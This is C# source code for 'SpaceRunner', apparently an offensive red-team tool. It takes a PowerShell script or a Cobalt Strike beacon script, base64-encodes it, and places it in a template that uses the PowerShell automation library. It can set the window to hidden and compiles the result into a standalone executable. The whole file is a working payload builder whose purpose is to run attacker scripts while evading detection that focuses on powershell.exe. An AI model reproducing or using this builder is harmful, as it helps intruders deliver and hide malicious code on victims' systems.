using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;

/*
c:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /preferreduilang:en-US /filealign:512 /out:spacerunner.exe /target:exe spacerunner.cs
*/

namespace SpaceRunner
{
    class Program
    {
        public static void Main(string[] args)
        {
            ShowBanner();
            if (args.Length == 0)
            {
                Console.WriteLine("[!] Missing arguments..\n");
                ShowHelp();
            }
            else
            {
                int intInputFile = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|input)$").Match(s).Success);
                int intOutputFile = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(o|output)$").Match(s).Success);
                int intHideWindows = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(h|hide)$").Match(s).Success);
                int intBeaconType = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(b|beacon)$").Match(s).Success);
                int intFunctions = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(f|functions)$").Match(s).Success);
                int intArguments = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(a|arguments)$").Match(s).Success);

                if (intInputFile != -1 && intOutputFile != -1)
                {
                    String stringInputFile = args[(intInputFile + 1)];
                    String stringOutputFile = args[(intOutputFile + 1)];

                    String stringFunctions = "";
                    if (intFunctions != -1)
                        stringFunctions = args[(intFunctions + 1)];

                    String stringArguments = "";
                    if (intArguments != -1)
                        stringArguments = args[(intArguments + 1)];

                    Boolean boolHideWindows = false;
                    if (intHideWindows != -1)
                        boolHideWindows = true;

                    Boolean boolBeaconType = false;
                    if (intBeaconType != -1)
                        boolBeaconType = true;

                    string stringProjectPath = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
                    string stringTemplateFile = stringProjectPath + "\\template.cs";
                    string stringAutomationFile = stringProjectPath + "\\system.management.automation.dll";
                    string stringCscPath = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe";
                    string stringTempFile = stringProjectPath + "\\template.cs.tmp";

                    List<string> listFunctions = new List<string>(stringFunctions.Split(','));
                    List<string> listArguments = new List<string>(stringArguments.Split('#'));

                    Console.WriteLine("[+] Project Path : {0}", stringProjectPath);
                    Console.WriteLine("[+] Intput File\t : {0}", stringInputFile);
                    Console.WriteLine("[+] Output File\t : {0}", stringOutputFile);
                    Console.WriteLine("[+] Template File: {0}", stringTemplateFile);
                    Console.WriteLine("[+] Template DLL : {0}", stringAutomationFile);
                    Console.WriteLine("[+] Temp File\t : {0}", stringTempFile);
                    Console.WriteLine("[+] Hide Windows : {0}", boolHideWindows.ToString());

                    if (File.Exists(stringInputFile) && File.Exists(stringTemplateFile) && File.Exists(stringAutomationFile))
                    {
                        if (File.Exists(stringOutputFile))
                        {
                            Console.WriteLine("[+] Output file '{0}' already exists! Confirm file overwrite ? [y/n]", stringOutputFile);
                            string stringConfirmation = Console.ReadLine();
                            if (stringConfirmation == "y")
                            {
                                Console.WriteLine("[!] Overwriting '{0}' file!", stringOutputFile);
                            }
                            else
                            {
                                Console.WriteLine("[!] Aborting... Please choose another output file !");
                                return;
                            }
                            
                        }
                        List<string> listPayload = new List<string>();
                        string stringInputFileContent = System.IO.File.ReadAllText(@stringInputFile);                       
                        
                        if (boolBeaconType == true)
                        {
                            listPayload.Add("function runThis { ");
                            listPayload.Add(stringInputFileContent);
                            listPayload.Add(" }");
                        }
                        else
                        {
                            listPayload.Add(stringInputFileContent);
                            listPayload.Add("function runThis { ");
                            int intFunctionNumber = 0;
                            string stringArgumentsItem;
                            if (intFunctions != -1) {
                                foreach (var stringfunctionItem in listFunctions) {
                                    if (listArguments.Count > intFunctionNumber)
                                    {
                                        stringArgumentsItem = listArguments[intFunctionNumber].ToString();
                                        Console.WriteLine("[+] Adding function '{0}' with arguments '{1}'", stringfunctionItem, stringArgumentsItem);
                                        listPayload.Add(stringfunctionItem + " " + stringArgumentsItem);
                                    }
                                    else{
                                        Console.WriteLine("[+] Adding function '{0}' without argument", stringfunctionItem);
                                        listPayload.Add(stringfunctionItem);
                                    }
                                    intFunctionNumber = intFunctionNumber + 1;
                                }
                            }
                            listPayload.Add(" }");
                        }

                        string stringPayload = string.Join(Environment.NewLine, listPayload);
                        var payloadBytes = System.Text.Encoding.UTF8.GetBytes(stringPayload);
                        Console.WriteLine("[+] Generating base64 encoded PowerShell script");
                        string stringBase64Payload = System.Convert.ToBase64String(payloadBytes);
                        string stringTemplateFileContent = File.ReadAllText(stringTemplateFile);
                        string stringTempPayload = stringTemplateFileContent.Replace("FIXME_BASE64", stringBase64Payload);
                        
                        if (boolHideWindows == true)
                            stringTempPayload = stringTempPayload.Replace(" Win32.ShowWindow(handle, SW_SHOW)", " Win32.ShowWindow(handle, SW_HIDE);");                    
                        
                        stringTempPayload = stringTempPayload.Replace("FIXME_FUNCTIONS", "runThis");
                        
                        System.IO.File.WriteAllText(@stringTempFile, stringTempPayload);

                        Console.WriteLine("[+] Compiling binary...");
                        string stringCmdText = "/c " + stringCscPath + " /reference:" + stringAutomationFile + " /target:exe /out:" + stringOutputFile + " " + stringTempFile;

                        ProcessStartInfo cmdsi = new ProcessStartInfo("cmd.exe");
                        cmdsi.Arguments = stringCmdText;
                        Process cmd = Process.Start(cmdsi);
                        cmd.WaitForExit();

                        Console.WriteLine("[+] File '{0}' compiled !", stringOutputFile);
                        Console.WriteLine("[+] Cleaning temporary files...");
                        System.IO.File.Delete(stringTempFile);

                        Console.WriteLine("[+] All good !");
                    }
                    else
                    {
                        Console.WriteLine("[!] All template files not found!");
                        return;
                    }
                }
                else{
                    Console.WriteLine("[!] Missing arguments..\n");
                    ShowHelp();
                    return;
                }
            }
        }

        public static void ShowHelp()
        {
            Console.WriteLine("    -i (--input)         Full path to the PowerShell input script file");
            Console.WriteLine("    -o (--output)        Full path to the generated output binary file");
            Console.WriteLine("    -h (--hide)          Optional, set the specified window's show state -> Default = False");
            Console.WriteLine("    -b (--beacon)        Optional, type of script provided (Cobalt Strike beacon) -> Default = Powershell script");
            Console.WriteLine("    -f (--functions)     Optional, set PowerShell function to call (function1,function2,...)");
            Console.WriteLine("    -a (--arguments)     Optional, set PowerShell function arguments to pass (\"function1Arg1 function1Arg2 ...#function2Arg1 function2Arg2 ...\")");
        }

        public static void ShowBanner()
        {
            Console.WriteLine(
                    "________                               ________                                  \n" +
                    "__  ___/_____________ ___________      ___  __ \\___  ____________________________\n" +
                    "_____ \\___  __ \\  __ `/  ___/  _ \\     __  /_/ /  / / /_  __ \\_  __ \\  _ \\_  ___/\n" +
                    "____/ /__  /_/ / /_/ // /__ /  __/     _  _, _// /_/ /_  / / /  / / /  __/  /    \n" +
                    "/____/ _  .___/\\__,_/ \\___/ \\___/      /_/ |_| \\__,_/ /_/ /_//_/ /_/\\___//_/     \n" +
                    "       /_/                                                                       \n");
        }
    }
}
